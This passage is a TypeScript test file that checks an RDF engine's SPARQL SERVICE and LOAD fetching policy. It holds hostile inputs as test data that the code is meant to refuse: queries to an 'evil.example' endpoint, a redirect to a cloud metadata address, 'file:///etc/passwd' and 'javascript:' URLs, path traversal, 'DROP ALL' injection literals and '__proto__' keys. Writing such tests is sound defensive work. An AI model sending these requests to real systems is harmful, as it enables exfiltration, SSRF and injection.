import { readFileSync } from 'node:fs'
import { parseHTML } from 'linkedom'
import * as ox from 'oxigraph'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { Engine, EngineError, Form, Format, Kind } from '../rdf-engine/host/engine.ts'
import { documentFor, endpointFor, FetchRefused, narrowPolicy, sparqlTerm, withFetching, type FetchPolicy } from '../rdf-engine/host/fetching.ts'
import { mockFetch, type MockDocument, type MockEndpoint } from '../rdf-engine/host/mock-endpoint.ts'
import { DataFactory } from 'n3'
import type { Quad, Term } from '@rdfjs/types'
import { createStore } from '../src/node/load.ts'
import { hybridStore } from '../src/store/hybrid.ts'
import { writeJelly } from '../src/jelly/encode.ts'
import { engineStore } from '../rdf-engine/host/store.ts'
import { NS } from '../src/ns.ts'
import { n3Store } from '../src/store/n3.ts'
import { oxigraphStore } from '../src/store/oxigraph.ts'
import { mount, type MountedApp } from '../src/web/mount.ts'

// SPARQL SERVICE and LOAD with the host fetching (rdf-engine/ABI.md, "Optional: fetching";
// docs/FETCHING.md): both builds give the same results and send the same requests, the host
// fetches only what its policy lists, and nothing a graph says reaches the network on its own.

const BUILDS = ['wat', 'rust'] as const
const modules = Object.fromEntries(BUILDS.map((b) => [b, new WebAssembly.Module(readFileSync(new URL(`../rdf-engine/build/${b}.wasm`, import.meta.url)))]))

const turtle = (text: string): MockEndpoint => ({ load: (e) => e.load(Format.Turtle, text) })
const ENDPOINTS: Record<string, MockEndpoint> = {
  'https://one.example/sparql': turtle('<http://a> <http://p> 1 . <http://b> <http://p> 2 . <http://a> <http://p> "x\\"y"@en .'),
  'https://two.example/sparql': turtle('<http://a> <http://q> "two" . _:n <http://q> "blank" .'),
}
const DOCUMENTS: Record<string, MockDocument> = {
  'https://data.example/dumps/d.ttl': { type: 'text/turtle; charset=utf-8', text: '<http://d> <http://p> _:x . _:x <http://p> "y"@en .' },
  'https://data.example/dumps/d.nt': { type: 'application/n-triples', text: '<http://e> <http://p> "z" .\n' },
  'https://data.example/dumps/d.json': { type: 'application/ld+json', text: '{}' },
  'https://data.example/dumps/d.jelly': {
    type: 'application/x-jelly-rdf',
    text: writeJelly(
      [
        DataFactory.quad(DataFactory.namedNode('http://j'), DataFactory.namedNode('http://p'), DataFactory.literal('jelly', 'en')),
        DataFactory.quad(DataFactory.namedNode('http://j'), DataFactory.namedNode('http://p'), DataFactory.blankNode('x')),
        DataFactory.quad(DataFactory.namedNode('http://j'), DataFactory.namedNode('http://p'), DataFactory.literal('elsewhere'), DataFactory.namedNode('http://other')),
      ],
      { physical: 2 },
    ),
  },
}
const LOCAL = `
<http://a> <http://r> <https://two.example/sparql> .
<http://b> <http://r> "not an IRI" .
<http://c> <http://r> _:blank .
`

function setup(build: (typeof BUILDS)[number], extra: Partial<FetchPolicy> = {}) {
  const module = modules[build]!
  const policy: FetchPolicy = {
    endpoints: { 'https://one.example/sparql': {}, 'https://two.example/sparql': {} },
    documents: { 'https://data.example/dumps/*': {} },
    ...extra,
  }
  const mock = mockFetch(module, ENDPOINTS, DOCUMENTS, () => policy)
  policy.fetch ??= mock.fetch
  const e = new Engine(module)
  e.load(Format.Turtle, LOCAL)
  // an IRI no query could write (the engine interns IRIs from the host unchecked)
  e.add(e.iri('http://a'), e.iri('http://alias'), e.iri('http://a b> } #'), 1)
  e.add(e.iri('http://b'), e.iri('http://alias'), e.iri('http://a'), 1)
  return { e, policy, mock }
}

const show = (e: Engine, id: number): string => {
  if (!id) return '-'
  const k = e.kind(id)
  if (k === Kind.BlankNode) return '_'
  if (k === Kind.Literal) return JSON.stringify(e.value(id)) + (e.lang(id) ? '@' + e.lang(id) : '')
  return e.value(id)
}

async function query(build: (typeof BUILDS)[number], text: string, extra?: Partial<FetchPolicy>, bind?: [string, string]) {
  const { e, policy, mock } = setup(build, extra)
  const q = e.prepare(text)
  if (bind) q.bind(bind[0], e.iri(bind[1]))
  try {
    const r = await withFetching(e, policy, () => q.run())
    const rows: string[] = []
    if (r.form === Form.Select) for (let i = 0; i < r.count; i++) rows.push(r.vars.map((_, j) => show(e, r.rows[i * r.vars.length + j]!)).join(' '))
    return { rows: rows.sort(), requests: mock.log.map((l) => `${l.method} ${l.url}\n${l.body}`) }
  } catch (err) {
    return { error: (err as Error).message, requests: mock.log.map((l) => `${l.method} ${l.url}\n${l.body}`) }
  }
}

const CASES: [string, string, (Partial<FetchPolicy> | undefined)?, [string, string]?][] = [
  ['bindings sent as VALUES', 'SELECT ?s ?o { ?s <http://r> ?ep SERVICE <https://one.example/sparql> { ?s <http://p> ?o } }'],
  ['no bindings', 'SELECT * { SERVICE <https://one.example/sparql> { ?s <http://p> ?o } }'],
  ['OPTIONAL SERVICE', 'SELECT * { ?s <http://r> ?ep OPTIONAL { SERVICE <https://two.example/sparql> { ?s <http://q> ?x } } }'],
  ['variable endpoint in scope', 'SELECT ?s ?x { ?s <http://r> ?ep FILTER(isIRI(?ep)) SERVICE ?ep { ?s <http://q> ?x } }'],
  ['variable endpoint not an IRI: no solutions there', 'SELECT ?s ?x { ?s <http://r> ?ep SERVICE ?ep { ?s <http://q> ?x } }'],
  ['variable endpoint not an IRI, SILENT', 'SELECT ?s ?x { ?s <http://r> ?ep SERVICE SILENT ?ep { ?s <http://q> ?x } }'],
  ['variable endpoint out of scope', 'SELECT * { ?s <http://r> ?ep OPTIONAL { SERVICE ?ep { ?s <http://q> ?x } } }'],
  ['endpoint from a parameter', 'SELECT ?s ?x { SERVICE ?ep { ?s <http://q> ?x } }', undefined, ['ep', 'https://two.example/sparql']],
  ['nested SERVICE', 'PREFIX e: <http://> SELECT * { SERVICE <https://one.example/sparql> { ?s e:p ?o SERVICE <https://two.example/sparql> { ?s e:q ?z } } }'],
  ['unlisted endpoint', 'SELECT * { SERVICE <https://evil.example/sparql> { ?s ?p ?o } }'],
  ['unlisted endpoint, SILENT', 'SELECT * { ?s <http://r> ?ep SERVICE SILENT <https://evil.example/sparql> { ?s ?p ?o } }'],
  ['a blank node is not sent', 'SELECT ?s ?x { ?s <http://r> ?b FILTER(isBlank(?b)) SERVICE <https://two.example/sparql> { ?b <http://q> ?x } }'],
  ['a hostile literal is escaped', 'SELECT ?o { VALUES ?o { "x\\"y"@en "a\\") } ; DROP ALL #" } SERVICE <https://one.example/sparql> { ?s <http://p> ?o } }'],
  ['an IRI that cannot be written goes without VALUES', 'SELECT ?s ?o { ?x <http://alias> ?s SERVICE <https://one.example/sparql> { ?s <http://p> ?o } }'],
  ['bindings: false', 'SELECT ?s ?o { ?s <http://r> ?ep SERVICE <https://one.example/sparql> { ?s <http://p> ?o } }', { endpoints: { 'https://one.example/sparql': { bindings: false } } }],
  ['MINUS and UNION around SERVICE', 'SELECT ?s { { ?s <http://r> ?ep } UNION { SERVICE <https://one.example/sparql> { ?s <http://p> 2 } } MINUS { SERVICE <https://two.example/sparql> { ?s <http://q> "two" } } }'],
  ['a compiled build declines it', 'SELECT * { SERVICE <https://one.example/sparql> { ?s <http://p> ?o } } LIMIT 1'],
]

describe('SERVICE: WAT and Rust give the same results and send the same requests', () => {
  for (const [name, text, extra, bind] of CASES) {
    it(name, async () => {
      const [wat, rust] = await Promise.all(BUILDS.map((b) => query(b, text, extra, bind)))
      // The same results; the VALUES each sends are its evaluator's own (ABI.md, "Optional: fetching").
      expect({ ...wat, requests: undefined }).toEqual({ ...rust, requests: undefined })
      expect({ results: { ...wat, requests: undefined }, wat: wat.requests, rust: rust.requests }).toMatchSnapshot()
    })
  }

  it('declines to compile a query with SERVICE, on both builds', () => {
    for (const b of BUILDS) {
      const e = new Engine(modules[b]!)
      expect(e.prepare('SELECT * { SERVICE <https://one.example/sparql> { ?s ?p ?o } }').compile()).toBe('not compilable: SERVICE')
    }
  })
})

describe('LOAD', () => {
  const update = async (build: (typeof BUILDS)[number], text: string) => {
    const { e, policy } = setup(build)
    try {
      await withFetching(e, policy, () => e.update(text))
    } catch (err) {
      return { error: (err as Error).message }
    }
    const q = e.match()
    const quads: string[] = []
    for (let i = 0; i < q.length; i += 4) quads.push([0, 1, 2, 3].map((k) => show(e, q[i + k]!)).join(' '))
    return { quads: quads.sort() }
  }
  for (const [name, text] of [
    ['into the default graph', 'LOAD <https://data.example/dumps/d.ttl>'],
    ['INTO GRAPH', 'LOAD <https://data.example/dumps/d.nt> INTO GRAPH <http://g>'],
    ['Jelly: its default graph only', 'LOAD <https://data.example/dumps/d.jelly> INTO GRAPH <http://g>'],
    ['in order with the other operations', 'LOAD <https://data.example/dumps/d.nt> ; INSERT { ?s <http://seen> true } WHERE { ?s <http://p> "z" }'],
    ['unlisted', 'LOAD <https://evil.example/x.ttl>'],
    ['unlisted, SILENT: nothing', 'LOAD SILENT <https://evil.example/x.ttl> ; INSERT DATA { <http://k> <http://k> <http://k> }'],
    ['a type it does not read', 'LOAD <https://data.example/dumps/d.json>'],
    ['a failed LOAD undoes the update', 'INSERT DATA { <http://k> <http://k> <http://k> } ; LOAD <https://data.example/dumps/missing.ttl>'],
  ] as const) {
    it(name, async () => {
      const [wat, rust] = await Promise.all(BUILDS.map((b) => update(b, text)))
      expect(wat).toEqual(rust)
      expect(wat).toMatchSnapshot()
    })
  }
})

describe('the engines check the answers they are given', () => {
  for (const b of BUILDS) {
    it(`${b}: an id that is not a term, or a triple that is not one, is refused`, () => {
      const e = new Engine(modules[b]!)
      expect(() => e.prepare('SELECT * { SERVICE <https://one.example/sparql> { ?s ?p ?o } }').run()).toThrow(/waiting/)
      const [r] = e.fetchRequests()
      expect(r!.asked).toBe(true)
      expect(() => e.fetchAnswer(0, [999_999, 0, 0], 1)).toThrow(EngineError)
      expect(() => e.fetchAnswer(0, [1, 0, 0], 1)).toThrow(EngineError)
      expect(() => e.fetchAnswer(0, [0, 0, 0, 0, 0, 0], 2)).not.toThrow()
      e.fetchClear()
      expect(() => e.update('LOAD <https://data.example/dumps/d.ttl>')).toThrow(/waiting/)
      const lit = e.literal('x')
      expect(() => e.fetchAnswer(0, [lit, e.iri('http://p'), lit], 1)).toThrow(EngineError)
      expect(() => e.fetchAnswer(0, [e.iri('http://s'), lit, lit], 1)).toThrow(EngineError)
      expect(e.fetchRequests()[0]!.state).toBe(0)
    })

    it(`${b}: only what the host's own call asked for is the host's to fetch`, () => {
      const e = new Engine(modules[b]!)
      expect(() => e.prepare('SELECT * { SERVICE <https://evil.example/sparql> { ?s ?p ?o } }').run()).toThrow(/waiting/)
      expect(() => e.prepare('SELECT * { SERVICE <https://one.example/sparql> { ?s ?p ?o } }').run()).toThrow(/waiting/)
      expect(e.fetchRequests().map((r) => [e.value(r.target), r.asked])).toEqual([
        ['https://evil.example/sparql', false],
        ['https://one.example/sparql', true],
      ])
    })
  }
})

describe('the policy', () => {
  const policy: FetchPolicy = {
    endpoints: { 'https://one.example/sparql': {}, 'urn:ex:catalog': { url: 'https://catalog.example/q', headers: { authorization: 'Bearer t' } } },
    documents: { 'https://data.example/dumps/*': {}, 'https://data.example/no-slash*': {}, 'https://exact.example/a.ttl': {} },
  }
  const refused = (f: () => unknown) => expect(f).toThrow(FetchRefused)

  it('lists endpoints by exact IRI, and maps a name to its address', () => {
    expect(endpointFor(policy, 'https://one.example/sparql').url.href).toBe('https://one.example/sparql')
    expect(endpointFor(policy, 'urn:ex:catalog').url.href).toBe('https://catalog.example/q')
    for (const iri of ['https://one.example/sparql/', 'HTTPS://ONE.EXAMPLE/sparql', 'https://one.example/sparql#x', 'https://one.example/sparql?x', 'https://evil.example/sparql', 'constructor', '__proto__', 'toString', 'hasOwnProperty'])
      refused(() => endpointFor(policy, iri))
  })

  it('refuses an address that is not http(s), has no host, or carries a user name', () => {
    for (const url of ['javascript:alert(1)', 'file:///etc/passwd', 'data:text/plain,x', 'https://one.example@evil.example/', 'https://u:p@one.example/', 'ftp://one.example/'])
      refused(() => endpointFor({ endpoints: { 'urn:x': { url } } }, 'urn:x'))
  })

  it('matches a document prefix after the URL parser normalizes it, on the same origin only', () => {
    expect(documentFor(policy, 'https://data.example/dumps/a.ttl').url.href).toBe('https://data.example/dumps/a.ttl')
    expect(documentFor(policy, 'HTTPS://DATA.EXAMPLE:443/dumps/x/../b.ttl').url.href).toBe('https://data.example/dumps/b.ttl')
    expect(documentFor(policy, 'https://exact.example/a.ttl').url.href).toBe('https://exact.example/a.ttl')
    for (const iri of [
      'https://data.example/dumps/../secret.ttl',
      'https://data.example/dumps/%2e%2e/secret.ttl',
      'https://data.example/dumpsX/a.ttl',
      'https://data.example.evil.example/dumps/a.ttl',
      'https://data.example@evil.example/dumps/a.ttl',
      'http://data.example/dumps/a.ttl',
      'https://data.example:8443/dumps/a.ttl',
      'https://data.example/no-slash-but-longer.ttl',
      'https://exact.example/a.ttl2',
      '__proto__',
    ])
      refused(() => documentFor(policy, iri))
  })
})

describe('the requests the host makes, and the responses it accepts', () => {
  const SELECT = 'SELECT * { SERVICE <https://one.example/sparql> { ?s <http://p> ?o } }'
  const run = async (fetchFn: typeof fetch, extra: Partial<FetchPolicy> = {}, text = SELECT, build: (typeof BUILDS)[number] = 'wat') => {
    const e = new Engine(modules[build]!)
    const policy: FetchPolicy = { endpoints: { 'https://one.example/sparql': {} }, fetch: fetchFn, ...extra }
    const q = e.prepare(text)
    return withFetching(e, policy, () => q.run())
  }
  const json = (body: string, type = 'application/sparql-results+json', init: ResponseInit = {}) => async () => new Response(body, { ...init, headers: { 'content-type': type, ...(init.headers as Record<string, string>) } })
  const RESULT = JSON.stringify({ head: { vars: ['s', 'o', 'extra'] }, results: { bindings: [{ s: { type: 'uri', value: 'http://a' }, o: { type: 'literal', value: '1' }, extra: { type: 'uri', value: 'http://x' } }] } })

  it('posts the query, refuses redirects, sends no credentials, and adds headers only for that remote', async () => {
    const f = vi.fn(json(RESULT))
    await run(f as unknown as typeof fetch, { endpoints: { 'https://one.example/sparql': { headers: { authorization: 'Bearer t' } } } })
    const [url, init] = f.mock.calls[0]! as unknown as [string, RequestInit]
    expect(url).toBe('https://one.example/sparql')
    expect(init).toMatchObject({ method: 'POST', redirect: 'error', credentials: 'omit', body: 'SELECT * WHERE { ?s <http://p> ?o }' })
    expect(init.headers).toMatchObject({ 'content-type': 'application/sparql-query', authorization: 'Bearer t' })
  })

  it('drops columns it did not ask for', async () => {
    const r = await run(json(RESULT) as unknown as typeof fetch)
    expect(r.form === Form.Select && r.vars).toEqual(['s', 'o'])
  })

  const fails = async (fetchFn: unknown, why: RegExp, extra: Partial<FetchPolicy> = {}) => {
    await expect(run(fetchFn as typeof fetch, extra)).rejects.toThrow(why)
    // SILENT: the one empty solution
    const r = await run(fetchFn as typeof fetch, extra, 'SELECT * { SERVICE SILENT <https://one.example/sparql> { ?s <http://p> ?o } }')
    expect(r.form === Form.Select && r.count).toBe(1)
  }

  it('fails a redirect, an error status, an unreachable host', async () => {
    await fails(async () => Response.redirect('http://169.254.169.254/', 302), /HTTP 302/)
    await fails(json('nope', 'text/plain', { status: 500 }), /HTTP 500/)
    await fails(async () => {
      throw new TypeError('fetch failed')
    }, /could not be reached/)
  })

  it('fails a body over the size limit, declared or streamed, without reading it all', async () => {
    await fails(json(RESULT, undefined, { headers: { 'content-length': String(1 << 30) } }), /larger than 100 bytes/, { maxBytes: 100 })
    let pulled = 0
    const endless = async () =>
      new Response(new ReadableStream({ pull: (c) => void (pulled++, c.enqueue(new Uint8Array(1024))) }), { headers: { 'content-type': 'application/sparql-results+json' } })
    await fails(endless, /larger than 4096 bytes/, { maxBytes: 4096 })
    expect(pulled).toBeLessThan(20)
  })

  it('fails a wrong content type, bad JSON, bad terms, too many rows', async () => {
    await fails(json(RESULT, 'text/html'), /unexpected content type text\/html/)
    await fails(json('{"results":'), /not JSON/)
    await fails(json(JSON.stringify({ results: { bindings: [{ s: { type: 'literal', value: 'x', 'xml:lang': 'en"><script' } }] } })), /language tag/)
    await fails(json(JSON.stringify({ results: { bindings: [{ s: { type: 'uri' } }] } })), /term value/)
    await fails(json(JSON.stringify({ results: { bindings: [{}, {}, {}] } })), /more than 2 solutions/, { maxRows: 2 })
  })

  it('times out, and stops at the deadline', async () => {
    const never = (_: unknown, init: RequestInit) => new Promise<Response>((_, reject) => init.signal!.addEventListener('abort', () => reject(new Error('aborted'))))
    await fails(never, /timed out/, { timeoutMs: 20 })
    await expect(run(json(RESULT) as unknown as typeof fetch, { deadline: Date.now() - 1 })).rejects.toThrow(/deadline/)
  })

  it('caps the requests of one operation', async () => {
    const f = vi.fn(json(JSON.stringify({ results: { bindings: [] } })))
    const text = 'SELECT * { VALUES ?ep { <https://one.example/sparql> <https://two.example/sparql> <https://three.example/sparql> } SERVICE ?ep { ?s ?p ?o } }'
    const endpoints = { 'https://one.example/sparql': {}, 'https://two.example/sparql': {}, 'https://three.example/sparql': {} }
    await expect(run(f as unknown as typeof fetch, { endpoints, maxRequests: 2 }, text)).rejects.toThrow(/more than 2 requests/)
    expect(f).toHaveBeenCalledTimes(2)
  })

  it('writes terms for VALUES exactly, or not at all', () => {
    const e = new Engine(modules.wat!)
    expect(sparqlTerm(e, e.literal('a") } ; DROP ALL #\n '))).toBe('"a\\") } ; DROP ALL #\\n\\u2028"')
    expect(sparqlTerm(e, e.langLiteral('x', 'en-gb', 2))).toBe('"x"@en-gb--rtl')
    expect(sparqlTerm(e, e.literal('1', e.iri('http://www.w3.org/2001/XMLSchema#integer')))).toBe('"1"^^<http://www.w3.org/2001/XMLSchema#integer>')
    expect(sparqlTerm(e, e.iri('http://a> } ; DROP ALL #'))).toBeUndefined()
    expect(sparqlTerm(e, e.bnode())).toBeUndefined()
  })
})

describe('store.query: the policy is the store\'s', () => {
  const ONE = 'https://one.example/sparql'
  const json = (bindings: unknown[]) => new Response(JSON.stringify({ results: { bindings } }), { headers: { 'content-type': 'application/sparql-results+json' } })
  const answering = () => vi.fn(async (_u: string | URL | Request, _i?: RequestInit) => json([{ o: { type: 'literal', value: '1' } }]))
  const store = (build: (typeof BUILDS)[number], fetchPolicy?: FetchPolicy) => engineStore(modules[build]!, build, { fetchPolicy })
  const ask = 'SELECT ?o { SERVICE <https://one.example/sparql> { <http://a> <http://p> ?o } }'
  const values = (rows: Map<string, Term>[]) => rows.map((r) => r.get('o')?.value)

  for (const b of BUILDS) {
    it(`${b}: configured once, then asked through query; a synchronous query refuses SERVICE and fetches nothing`, async () => {
      const f = answering()
      const s = store(b, { endpoints: { [ONE]: {} }, fetch: f as unknown as typeof fetch })
      expect(() => s.select(ask, [])).toThrow(/only store.query and store.update run them/)
      expect(() => s.construct('CONSTRUCT { <http://a> <http://p> ?o } WHERE { SERVICE SILENT <https://one.example/sparql> { <http://a> <http://p> ?o } }', [])).toThrow(/only store.query/)
      expect(f).not.toHaveBeenCalled()
      expect(s.engine.fetchRequests()).toEqual([])
      expect(values(await s.query<Map<string, Term>[]>(ask))).toEqual(['1'])
      expect(values(await s.query<Map<string, Term>[]>(ask))).toEqual(['1'])
      expect(f).toHaveBeenCalledTimes(2)
      expect(s.engine.fetchRequests()).toEqual([])
    })

    it(`${b}: query answers any query, fetching nothing when it has no SERVICE`, async () => {
      const f = answering()
      const s = store(b, { endpoints: { [ONE]: {} }, fetch: f as unknown as typeof fetch })
      s.loadTurtle('<http://a> <http://p> 1 . <http://a> <http://q> "x" .')
      expect(values(await s.query<Map<string, Term>[]>('SELECT ?o { <http://a> <http://p> ?o }'))).toEqual(['1'])
      expect(await s.query('ASK { <http://a> <http://q> "x" }')).toBe(true)
      expect((await s.query<Quad[]>('CONSTRUCT { ?s <http://r> ?o } WHERE { ?s <http://q> ?o }')).map((q) => q.predicate.value)).toEqual(['http://r'])
      expect(f).not.toHaveBeenCalled()
    })

    it(`${b}: an endpoint the store does not list is refused, and nothing is fetched`, async () => {
      const f = answering()
      const s = store(b, { endpoints: { 'https://two.example/sparql': {} }, fetch: f as unknown as typeof fetch })
      await expect(s.query(ask)).rejects.toThrow(/SERVICE <https:\/\/one.example\/sparql>: not an endpoint this page may query/)
      expect(await s.query('SELECT ?o { SERVICE SILENT <https://one.example/sparql> { <http://a> <http://p> ?o } }')).toEqual([new Map()])
      // No policy at all: nothing may be fetched.
      await expect(store(b).query(ask)).rejects.toThrow(/not an endpoint this page may query/)
      expect(f).not.toHaveBeenCalled()
    })

    it(`${b}: a call's policy narrows the store's, and can never widen it`, async () => {
      const f = answering()
      const s = store(b, { endpoints: { [ONE]: { headers: { authorization: 'Bearer t' } } }, fetch: f as unknown as typeof fetch })
      // Narrowed to another endpoint: this one is no longer listed for the call.
      await expect(s.query(ask, { policy: { endpoints: { 'https://two.example/sparql': {} } } })).rejects.toThrow(/not an endpoint this page may query/)
      await expect(s.query(ask, { policy: {} })).rejects.toThrow(/not an endpoint this page may query/)
      // A deadline already past: nothing is fetched.
      await expect(s.query(ask, { policy: { endpoints: { [ONE]: {} }, deadline: Date.now() - 1 } })).rejects.toThrow()
      expect(f).not.toHaveBeenCalled()
      // Listed by both: fetched as the store says, with its headers.
      expect(values(await s.query<Map<string, Term>[]>(ask, { policy: { endpoints: { [ONE]: {} } } }))).toEqual(['1'])
      expect((f.mock.calls[0]![1]!.headers as Record<string, string>).authorization).toBe('Bearer t')
      // Where and how to fetch is the store's alone.
      for (const policy of [{ endpoints: { [ONE]: { url: 'https://evil.example/sparql' } } }, { endpoints: { [ONE]: { headers: { cookie: 'x' } } } }, { fetch: f as unknown as typeof fetch }])
        await expect(s.query(ask, { policy })).rejects.toThrow(/only narrows the store's/)
      expect(f).toHaveBeenCalledTimes(1)
    })

    it(`${b}: the host replaces the policy; the object it gave is read once`, async () => {
      const f = answering()
      const given: FetchPolicy = { endpoints: {}, fetch: f as unknown as typeof fetch }
      const s = store(b, given)
      given.endpoints![ONE] = {}
      await expect(s.query(ask)).rejects.toThrow(/not an endpoint/)
      s.setFetchPolicy({ endpoints: { [ONE]: {} }, fetch: f as unknown as typeof fetch })
      expect(values(await s.query<Map<string, Term>[]>(ask))).toEqual(['1'])
      s.setFetchPolicy(undefined)
      await expect(s.query(ask)).rejects.toThrow(/not an endpoint/)
      expect(f).toHaveBeenCalledTimes(1)
    })

    it(`${b}: LOAD through update, then seen by match`, async () => {
      const { fetch } = mockFetch(modules[b]!, {}, DOCUMENTS)
      const s = store(b, { documents: { 'https://data.example/dumps/*': {} }, fetch })
      const f = s.factory
      expect(s.match(f.namedNode('http://e'), null, null)).toEqual([])
      await expect(s.update('LOAD <https://data.example/dumps/d.nt>', { policy: { documents: { 'https://data.example/dumps/d.ttl': {} } } })).rejects.toThrow(/not a document this page may load/)
      await s.update('LOAD <https://data.example/dumps/d.nt>')
      expect(s.match(f.namedNode('http://e'), null, null).map((q) => q.object.value)).toEqual(['z'])
    })

    it(`${b}: operations on one store run one at a time`, async () => {
      const order: string[] = []
      let calls = 0
      const slow = async () => {
        const name = calls++ ? 'b' : 'a'
        order.push('start ' + name)
        await new Promise((r) => setTimeout(r, name === 'a' ? 30 : 1))
        order.push('end ' + name)
        return json([])
      }
      const s = store(b, { endpoints: { [ONE]: {} }, fetch: slow as unknown as typeof fetch })
      await Promise.all([s.query('SELECT * { SERVICE <https://one.example/sparql> { ?s ?p ?o } }'), s.query('SELECT * { SERVICE <https://one.example/sparql> { ?s ?p 1 } }')])
      expect(order).toEqual(['start a', 'end a', 'start b', 'end b'])
    })
  }

  it('createStore takes the policy; Oxigraph, Hybrid and N3 refuse one', async () => {
    const f = answering()
    const s = createStore('wat', { fetchPolicy: { endpoints: { [ONE]: {} }, fetch: f as unknown as typeof fetch } })
    expect(values(await s.query<Map<string, Term>[]>(ask))).toEqual(['1'])
    for (const kind of ['oxigraph', 'hybrid', 'n3'] as const) expect(() => createStore(kind, { fetchPolicy: { endpoints: { [ONE]: {} } } })).toThrow(/does not fetch/)
  })

  it('Oxigraph answers through query, and refuses SERVICE and LOAD plainly; N3 has no SPARQL', async () => {
    for (const s of [oxigraphStore(ox), hybridStore(ox)]) {
      s.loadTurtle('<http://a> <http://p> 1 .')
      expect(values(await s.query<Map<string, Term>[]>('SELECT ?o { <http://a> <http://p> ?o }'))).toEqual(['1'])
      expect(await s.query('ASK { <http://a> <http://p> 1 }')).toBe(true)
      await expect(s.query(ask)).rejects.toThrow(/does not fetch: SERVICE and LOAD need one of Semblance's engines/)
      expect(s.setFetchPolicy).toBeUndefined()
      s.dispose?.()
    }
    const o = oxigraphStore(ox)
    await expect(o.update!('LOAD <https://data.example/dumps/d.nt>')).rejects.toThrow(/does not fetch/)
    await o.update!('INSERT DATA { <http://a> <http://p> 2 }')
    expect(o.match(null, null, null).length).toBe(1)
    o.dispose?.()
    await expect(n3Store().query('ASK {}')).rejects.toThrow(/no SPARQL engine/)
  })
})

describe('narrowPolicy', () => {
  const store: FetchPolicy = {
    endpoints: { 'urn:ex:catalog': { url: 'https://cat.example/sparql', bindings: false, timeoutMs: 5000 } },
    documents: { 'https://data.example/dumps/*': { maxBytes: 1000 }, 'https://data.example/one.ttl': {}, 'urn:ex:doc': { url: 'https://docs.example/d.ttl' } },
    maxRequests: 10,
  }

  it('keeps what both list, at the store\'s address, within the smaller limits', () => {
    const n = narrowPolicy(store, { endpoints: { 'urn:ex:catalog': { timeoutMs: 100, bindings: true }, 'https://evil.example/sparql': {} }, maxRequests: 50, maxRows: 5, deadline: 7 })
    expect(n.endpoints).toEqual({ 'urn:ex:catalog': { url: 'https://cat.example/sparql', bindings: false, timeoutMs: 100, maxBytes: undefined } })
    expect(endpointFor(n, 'urn:ex:catalog').url.href).toBe('https://cat.example/sparql')
    expect(() => endpointFor(n, 'https://evil.example/sparql')).toThrow(FetchRefused)
    expect([n.maxRequests, n.maxRows, n.deadline]).toEqual([10, 5, 7])
    expect(narrowPolicy(store, undefined)).toBe(store)
  })

  it('narrows documents: exact ones the store would load, prefixes to the narrower', () => {
    const n = narrowPolicy(store, { documents: { 'https://data.example/dumps/2024/*': {}, 'https://data.example/dumps/a.ttl': {}, 'urn:ex:doc': {}, 'https://elsewhere.example/*': {}, 'https://data.example/*': { maxBytes: 10 } } })
    expect(documentFor(n, 'https://data.example/dumps/2024/x.ttl').url.href).toBe('https://data.example/dumps/2024/x.ttl')
    expect(documentFor(n, 'https://data.example/dumps/a.ttl').url.href).toBe('https://data.example/dumps/a.ttl')
    expect(documentFor(n, 'urn:ex:doc').url.href).toBe('https://docs.example/d.ttl')
    // The call's wider prefix: only what the store lists under it, within the call's limit.
    expect(documentFor(n, 'https://data.example/dumps/b.ttl').remote.maxBytes).toBe(10)
    expect(documentFor(n, 'https://data.example/one.ttl').remote.maxBytes).toBe(10)
    expect(() => documentFor(n, 'https://data.example/two.ttl')).toThrow(FetchRefused)
    expect(() => documentFor(n, 'https://elsewhere.example/x.ttl')).toThrow(FetchRefused)
    expect(() => documentFor(narrowPolicy(store, { documents: { 'https://evil.example/x.ttl': {} } }), 'https://evil.example/x.ttl')).toThrow(FetchRefused)
  })
})

describe('authored content never reaches the network', () => {
  const EX = 'https://example.org/app#'
  const PFX = `@prefix ex: <${EX}> .\n` + Object.entries(NS).filter(([k]) => /^[a-z]+$/.test(k)).map(([k, v]) => `@prefix ${k}: <${v}> .`).join('\n') + '\n'
  const apps: MountedApp[] = []
  afterEach(() => {
    for (const app of apps.splice(0)) app.unmount()
    vi.restoreAllMocks()
    vi.unstubAllGlobals()
  })

  /** A page to mount in; every request it makes is recorded (the engine's wasm is served, an endpoint answers no solutions). */
  function page() {
    const { document, window } = parseHTML('<!doctype html><html><body><main id="app"></main></body></html>')
    document.adoptedStyleSheets = []
    Object.defineProperty(window, 'CSSStyleSheet', { value: class { replaceSync() {} }, configurable: true })
    Object.defineProperty(window, 'requestAnimationFrame', { value: () => 1, configurable: true })
    Object.defineProperty(window, 'cancelAnimationFrame', { value: () => {}, configurable: true })
    vi.stubGlobal('requestIdleCallback', () => 0)
    const wasm = readFileSync(new URL('../rdf-engine/build/wat.wasm', import.meta.url))
    const fetched: string[] = []
    vi.stubGlobal('fetch', async (url: string) => {
      fetched.push(String(url))
      if (!String(url).endsWith('.wasm')) return new Response(JSON.stringify({ results: { bindings: [] } }), { headers: { 'content-type': 'application/sparql-results+json' } })
      return new Response(wasm, { headers: { 'Content-Type': 'application/wasm' } })
    })
    return { document, fetched }
  }
  const navigation = () => ({ location: { pathname: '/', search: '', hash: '' }, history: { state: null, pushState() {}, replaceState() {} }, events: new EventTarget(), links: new EventTarget() })

  it('authored content cannot configure fetching: the policy is the host\'s, read from no graph', async () => {
    const { document, fetched } = page()
    // Whatever an author writes, about endpoints or policies, is data: the host gave no policy.
    const authored = `${PFX}
ex:page a c:Stack ; c:children ( ex:hi ) .
ex:hi a c:Text ; c:label "hi" .
ex:policy ex:endpoints <https://evil.example/sparql> ; ex:fetchPolicy "{\\"endpoints\\":{\\"https://evil.example/sparql\\":{}}}" .`
    const app = await mount(document.getElementById('app')!, { root: EX + 'page', authored: [authored], store: 'wat', files: false, fullscreen: false, onRefused: () => {}, navigation: navigation() })
    apps.push(app)
    await expect(app.store.query('SELECT * { SERVICE <https://evil.example/sparql> { ?s ?p ?o } }')).rejects.toThrow(/not an endpoint this page may query/)
    expect(fetched.filter((u) => !u.endsWith('.wasm'))).toEqual([])
    // A store that does not fetch refuses a policy outright.
    await expect(mount(document.getElementById('app')!, { root: EX + 'page', graphs: [authored], store: 'oxigraph', fetchPolicy: { endpoints: {} } })).rejects.toThrow(/does not fetch/)
  })

  it('an authored SPARQL rule with SERVICE fails like any failing rule, and nothing is fetched, though the host lists the endpoint', async () => {
    const { document, fetched } = page()
    const authored = `${PFX}
ex:Leak a owl:Class ; rdfs:subClassOf sem:Component ; sem:slug "ex-leak" .
ex:LeakRendering a sem:Rendering ; sem:targets ex:Leak ; sem:stratum 0 .
